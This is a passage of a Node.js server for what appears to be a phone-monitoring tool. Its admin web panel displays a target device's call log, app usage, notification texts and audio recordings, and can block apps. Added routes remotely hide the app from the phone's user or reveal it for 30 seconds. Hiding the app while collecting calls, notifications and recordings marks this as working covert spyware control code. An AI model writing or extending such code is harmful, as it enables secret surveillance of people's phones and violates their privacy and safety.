      div.innerHTML = \`<table><tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Time</th></tr>\${calls.map(c=>\`<tr><td>\${c.number}</td><td>\${c.name||'-'}</td><td>\${c.type==='Incoming'?'📲':c.type==='Outgoing'?'📞':'❌'} \${c.type}</td><td>\${Math.floor(c.duration/60)}m\${c.duration%60}s</td><td>\${new Date(c.time).toLocaleString('en-IN',{timeZone:'Asia/Kathmandu'})}</td></tr>\`).join('')}</table>\`;
    } catch(e) { console.error(e); }
  }

  async function loadApps() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/appusage?device=' + encodeURIComponent(selectedDevice));
      const apps = await res.json();
      const div = document.getElementById('appsList');
      if (!apps.length) { div.innerHTML = '<div class="empty">📊 Koi data nahi</div>'; return; }
      div.innerHTML = \`<table><tr><th>App</th><th>Time</th><th>Action</th></tr>\${apps.map(a=>\`<tr><td>\${a.package}</td><td>⏱️ \${a.minutes}m</td><td><button onclick="blockAppDirect('\${a.package}')" style="background:#f44336;color:white;border:none;padding:4px 8px;border-radius:6px;cursor:pointer;font-size:11px">Block</button></td></tr>\`).join('')}</table>\`;
    } catch(e) { console.error(e); }
  }

  function blockAppDirect(pkg) { document.getElementById('blockPkg').value = pkg; sendSignal('block_app', { package: pkg }); }

  async function loadNotifications() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/notifications?device=' + encodeURIComponent(selectedDevice));
      const notifs = await res.json();
      const div = document.getElementById('notifList');
      if (!notifs.length) { div.innerHTML = '<div class="empty">🔔 Koi notification nahi</div>'; return; }
      div.innerHTML = notifs.map(n=>\`<div class="card"><div style="font-size:11px;color:#2196F3">\${n.app}</div><div style="font-size:14px;font-weight:600">\${n.title}</div><div style="font-size:13px;color:#aaa">\${n.text}</div><div style="font-size:11px;color:#555">\${new Date(n.time).toLocaleString('en-IN',{timeZone:'Asia/Kathmandu'})}</div></div>\`).join('');
    } catch(e) { console.error(e); }
  }

  async function loadFiles() {
    if (!selectedDevice) return;
    try {
      const res = await fetch('/files?device=' + encodeURIComponent(selectedDevice));
      const files = await res.json();
      const div = document.getElementById('files');
      if (!files.length) { div.innerHTML = '<div class="empty">🎵 Koi recording nahi</div>'; return; }
      div.innerHTML = files.map(f=>\`<div class="card"><div style="font-size:12px;color:#888">🎙️ \${f.time}</div><audio controls src="\${f.url}"></audio></div>\`).join('');
    } catch(e) { console.error(e); }
  }

  function loadAll() { loadFiles(); loadNotifications(); showToast('Refresh!'); }

  // ---------- ADDED: Show/Hide App UI functions ----------
  async function showAppUI() {
    if (!selectedDevice) { showToast('Device select karo!', 'error'); return; }
    await fetch('/show_app?device=' + encodeURIComponent(selectedDevice));
    showToast('📱 App UI dikhai dega 30 sec ke liye!');
  }

  async function hideAppUI() {
    if (!selectedDevice) { showToast('Device select karo!', 'error'); return; }
    await fetch('/hide_app?device=' + encodeURIComponent(selectedDevice));
    showToast('🚫 App hidden!');
  }

  loadDevices();
  setInterval(loadDevices, 10000);
  setInterval(() => { if (selectedDevice) loadNotifications(); }, 5000);
  setInterval(() => { if (selectedDevice) loadFiles(); }, 30000);
  setInterval(() => { if (selectedDevice) loadGeofenceAlerts(); }, 15000);
</script>
</body>
</html>
  `);
});

// ---------- ADDED: Admin panel se app show/hide ke liye ----------
// Show app button
app.get('/show_app', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  await sendFCMSignal(device, 'show_app');
  res.json({ success: true, message: 'App UI shown for 30 seconds' });
});

// Hide app button
app.get('/hide_app', async (req, res) => {
  const device = req.query.device;
  if (!device) return res.status(400).json({ error: 'Device required' });
  
  await sendFCMSignal(device, 'hide_app');
  res.json({ success: true, message: 'App hidden' });
});

server.listen(PORT, () => console.log('Server running on port ' + PORT));
